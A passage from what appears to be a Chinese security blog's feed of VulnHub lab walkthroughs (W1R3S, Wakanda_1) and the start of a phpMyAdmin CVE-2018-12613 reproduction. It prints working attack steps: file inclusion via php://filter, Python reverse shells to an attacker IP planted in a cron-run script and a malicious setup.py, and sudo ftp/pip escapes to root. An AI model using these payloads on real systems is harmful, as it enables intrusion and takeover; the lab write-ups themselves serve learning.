class="line-numbers-rows"><span></span></span></code></pre><p>命令详解</p><pre class="line-numbers language-none"><code class="language-none">-m 指定使用的方式-a 使用字典破解-O 启动优化<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220804155444.png|L]]</p><p>破解出用户 w1r3s 密码为 computer，使用 ssh 进行登录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> w1r3s@192.168.0.102<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220804155724.png|L]]</p><h2 id="5-权限提升"><a href="#5-权限提升" class="headerlink" title="5. 权限提升"></a>5. 权限提升</h2><p>尝试提取，查看内核版本</p><p>![[../../../../pic/Pasted image 20220804155818.png|L]]</p><p>直接使用 sudo 进行执行命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">w1r3s@W1R3S:~$ <span class="token function">sudo</span> <span class="token function">su</span>sudo: unable to resolve <span class="token function">host</span> W1R3Sroot@W1R3S:/home/w1r3s<span class="token comment"># ls /root</span>flag.txtroot@W1R3S:/home/w1r3s<span class="token comment"># cat /root/f*</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220804160207.png|L]]</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">w1r3s@W1R3S:~$ <span class="token function">sudo</span> <span class="token function">ftp</span>sudo: unable to resolve <span class="token function">host</span> W1R3Sftp<span class="token operator">&gt;</span> <span class="token operator">!</span>/bin/bashroot@W1R3S:~<span class="token comment"># id</span><span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="6-小结"><a href="#6-小结" class="headerlink" title="6. 小结"></a>6. 小结</h2><ul><li>FTP匿名用户登录</li><li>Cuppa CMS 任意文件包含漏洞</li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VulnHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub - WAKANDA_1</title>
      <link href="/2023/01/28/penetrationstest/ba-chang-xue-xi/vulnhub/vulnhub-wakanda-1/"/>
      <url>/2023/01/28/penetrationstest/ba-chang-xue-xi/vulnhub/vulnhub-wakanda-1/</url>
      
        <content type="html"><![CDATA[<h1 id="VulnHub-WAKANDA-1"><a href="#VulnHub-WAKANDA-1" class="headerlink" title="VulnHub - WAKANDA_1"></a>VulnHub - WAKANDA_1</h1><h2 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h2><ul><li>靶场地址：<a href="https://www.vulnhub.com/entry/wakanda-1,251/">VulnHub 链接</a></li><li>难度：中等</li></ul><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2. 信息收集"></a>2. 信息收集</h2><h3 id="2-1-主机发现"><a href="#2-1-主机发现" class="headerlink" title="2.1 主机发现"></a>2.1 主机发现</h3><p>先探测下靶机的 IP 地址</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span>  <span class="token number">192.168</span>.0.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/image-20230129195618774.png"></p><h3 id="2-2-端口扫描"><a href="#2-2-端口扫描" class="headerlink" title="2.2 端口扫描"></a>2.2 端口扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sC</span> -p- <span class="token parameter variable">-T4</span> <span class="token number">192.168</span>.0.106<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/image-20230129195952191.png"></p><p>开放了 80,111,3333,52891 端口</p><h2 id="3-WEB-信息收集"><a href="#3-WEB-信息收集" class="headerlink" title="3. WEB 信息收集"></a>3. WEB 信息收集</h2><p>访问 <a href="http://192.168.0.106/">http://192.168.0.106/</a></p><p>一个主页，也没啥东西</p><p><img src="/../../../../pic/image-20230129200224846.png"></p><p>探测一下使用到的技术</p><p><img src="/../../../../pic/image-20230129200323925.png"></p><p>看着还挺干净的，查看下网页源码</p><p><img src="/../../../../pic/image-20230129200617360.png"></p><p>该参数似乎用于修改页面的显示语言</p><p>访问 <a href="http://192.168.0.106/?lang=fr">http://192.168.0.106/?lang=fr</a></p><p><img src="/../../../../pic/image-20230129201221130.png"></p><p>页面显示为法语，尝试输入其他语言，页面显示为空，进一步探测没啥结果先扫描一下目录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gobuster <span class="token function">dir</span> <span class="token parameter variable">--url</span> <span class="token string">"http://192.168.0.106/"</span> <span class="token parameter variable">--wordlist</span> <span class="token string">"/usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt"</span> <span class="token parameter variable">-x</span> <span class="token string">"php,html,jsp,tar.gz,bak"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/image-20230129201024594.png"></p><p>存在 fr.php，那之前的 lang 参数是否是用于包含改文件</p><p>访问 <a href="http://192.168.0.106/?lang=index%EF%BC%8C%E6%9C%80%E5%90%8E%E9%A1%B5%E9%9D%A2%E7%8A%B6%E6%80%81%E7%A0%81%E4%B8%BA">http://192.168.0.106/?lang=index，最后页面状态码为</a> 500，推测为多次 302 跳转的结果，基本确认存在文件包含，而且限制了文件后缀，使用 php://filter 读取下页面源代码</p><p>访问 <a href="http://192.168.0.106/?lang=php://filter/convert.base64-encode/resource=index">http://192.168.0.106/?lang=php://filter/convert.base64-encode/resource=index</a></p><p><img src="/../../../../pic/image-20230129201757157.png"></p><p>获取到页面源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$password</span> <span class="token operator">=</span><span class="token string double-quoted-string">"Niamey4Ever227!!!"</span> <span class="token punctuation">;</span><span class="token comment">//I have to remember it</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'lang'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'lang'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content-type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/html; charset=UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1, shrink-to-fit=no<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>description<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Vibranium market<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>author<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mamadou<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Vibranium Market<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bootstrap.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>cover.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text-center<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>cover-container d-flex w-100 h-100 p-3 mx-auto flex-column<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>header</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>masthead mb-auto<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>inner<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>masthead-brand<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Vibranium Market<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>nav</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav nav-masthead justify-content-center<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav-link active<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Home<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>            <span class="token comment">&lt;!-- &lt;a class="nav-link active" href="?lang=fr"&gt;Fr/a&gt; --&gt;</span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>nav</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>header</span><span class="token punctuation">&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span> <span class="token attr-name">role</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>main<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>inner cover<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>cover-heading<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Coming soon<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lead<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>          <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'lang'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>          <span class="token keyword">echo</span> <span class="token variable">$message</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">else</span>          <span class="token punctuation">{</span>            <span class="token delimiter important">?&gt;</span></span>            Next opening of the largest vibranium market. The products come directly from the wakanda. stay tuned!            <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>          <span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lead<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-lg btn-secondary<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Learn more<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>main</span><span class="token punctuation">&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>footer</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mastfoot mt-auto<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>inner<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>Made by<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>@mamadou<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>footer</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只有一个文件包含没有什么进一步利用的点，但是注意到给出了一个密码，在没有后台的情况下该密码用来干啥？</p><p>尝试登录下 SSH,页面最下方存在一个 <code>Made by@mamadou</code>，那这个是不是用户名呢？</p><p><img src="/../../../../pic/image-20230129202205395.png"></p><p>事实证明页面上给出的东西还都是有用的</p><p>进入后是个 Python 的命令框，转 tty</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pty<span class="token punctuation">;</span> pty<span class="token punctuation">.</span>spawn<span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/image-20230129202453088.png"></p><p>题目给了提示存在三个 flag</p><p>在 mamadou 用户目录下找到第一个 flag</p><p><img src="/../../../../pic/image-20230129202555854.png"></p><p>使用 find 命令找一下，根据命名格式找一下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-type</span> <span class="token string">"f"</span> <span class="token parameter variable">-name</span> <span class="token string">"flag[2,3].txt"</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/image-20230129232027743.png"></p><p>尝试读取了一下发现还没有权限，接下来就去搞一下提权</p><h2 id="4-提权"><a href="#4-提权" class="headerlink" title="4. 提权"></a>4. 提权</h2><h3 id="4-1-通过计划任务获取-devops-权限"><a href="#4-1-通过计划任务获取-devops-权限" class="headerlink" title="4.1 通过计划任务获取 devops 权限"></a>4.1 通过计划任务获取 devops 权限</h3><p>要读取 flag2 需要先获取下 devops 用户的权限</p><p>查看下哪些文件属于 devops</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-user</span> devops <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">"Permission denied\|proc"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/image-20230129220332737.png"></p><p>看一下 python 文件的权限</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> <span class="token parameter variable">-la</span> /srv/.antivirus.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/image-20230129220424543.png"></p><p>普通用户可以进行读写，但是没有 SGID，想要进一步利用查看是否有计划任务调用该文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-name</span> <span class="token string">"*antivirus*"</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/image-20230129232511981.png"></p><p>存在计划任务，读取一下</p><p><img src="/../../../../pic/image-20230129232801844.png"></p><p>每过 300 秒会以 devops 执行 /srv/.antivirus.py 文件，可以向里面写入反弹 shell 获取 devops 用户权限</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token punctuation">,</span>subprocess<span class="token punctuation">,</span>os<span class="token punctuation">;</span>s<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"192.168.0.105"</span><span class="token punctuation">,</span><span class="token number">10010</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">import</span> pty<span class="token punctuation">;</span> pty<span class="token punctuation">.</span>spawn<span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/image-20230129233931942.png"></p><p>先读取下 flag</p><p><img src="/../../../../pic/image-20230129234049344.png"></p><p>OK，第二个 flag 已经获取了，那么第三个 flag 应该就在 root 下了</p><h3 id="4-2-获取-root-权限"><a href="#4-2-获取-root-权限" class="headerlink" title="4.2 获取 root 权限"></a>4.2 获取 root 权限</h3><p>devops 在用户组 developer 中，查看这个组能操作哪些文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-group</span> developer <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">"proc"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/image-20230129234545447.png"></p><p>可以运行 pip 文件</p><p><img src="/../../../../pic/image-20230129234611341.png"></p><p>pip 是 python 的包管理工具，可以在 install 运行 setup.py 时执行 shell</p><p>编写个 setup.py</p><ul><li>setup.py</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> pty<span class="token keyword">import</span> socket<span class="token keyword">from</span> setuptools <span class="token keyword">import</span> setup<span class="token keyword">def</span> <span class="token function">get_shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"192.168.0.105"</span><span class="token punctuation">,</span> <span class="token number">10011</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>    pty<span class="token punctuation">.</span>spawn<span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">)</span>get_shell<span class="token punctuation">(</span><span class="token punctuation">)</span>setup<span class="token punctuation">(</span>    name<span class="token operator">=</span><span class="token string">"getshell"</span><span class="token punctuation">,</span>    version<span class="token operator">=</span><span class="token string">"1.0"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在靶机上运行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pip <span class="token function">install</span> setup.py <span class="token builtin class-name">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在本机获得 shell</p><p><img src="/../../../../pic/image-20230130004354178.png"></p><p>接下来就是读取 flag！</p><p><img src="/../../../../pic/image-20230130004434342.png"></p><h2 id="5-参考链接"><a href="#5-参考链接" class="headerlink" title="5. 参考链接"></a>5. 参考链接</h2><p><a href="http://kuanghy.github.io/2018/04/29/setup-dot-py">Python 库打包分发(setup.py 编写)简易指南</a></p><p><a href="https://blog.csdn.net/a1004070060/article/details/105298496">VulnHub实战篇二：Wakanda-1靶机渗透记录</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VulnHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPMyAdmin 文件包含漏洞</title>
      <link href="/2023/01/28/penetrationstest/lou-dong-fu-xian/phpmyadmin/phpmyadmin-wen-jian-bao-han-lou-dong/"/>
      <url>/2023/01/28/penetrationstest/lou-dong-fu-xian/phpmyadmin/phpmyadmin-wen-jian-bao-han-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="PHPMyAdmin-文件包含漏洞"><a href="#PHPMyAdmin-文件包含漏洞" class="headerlink" title="PHPMyAdmin 文件包含漏洞"></a>PHPMyAdmin 文件包含漏洞</h1><p>#CVE-2018-12613</p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>在 4.8.2 之前的 phpMyAdmin 4.8.x 中发现了一个问题，攻击者可以在其中包含（查看并可能执行）服务器上的文件。该漏洞来自页面重定向和在phpMyAdmin中加载的部分代码，以及对列入白名单的页面的不正确测试。除 <code>$cfg['AllowArbitraryServer'] = true</code> 情况（攻击者可以指定他/她已经控制的任何主机，并在phpMyAdmin上执行任意代码）外，攻击者还必须经过身份验证。 <code>['ServerDefault'] = 0</code> 的情况（绕过登录要求，并在没有任何身份验证的情况下运行易受攻击的代码）。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>phpMyAdmin 4.8.0、4.8.1</p><h2 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h2><p>使用 <a href="https://github.com/vulhub/vulhub">vulhub</a> 一键启动环境</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> vulhub/phpmyadmin/CVE-2018-12613/<span class="token function">sudo</span> <span class="token function">docker-compose</span> up <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞点位于 <code>index.php</code>  的第 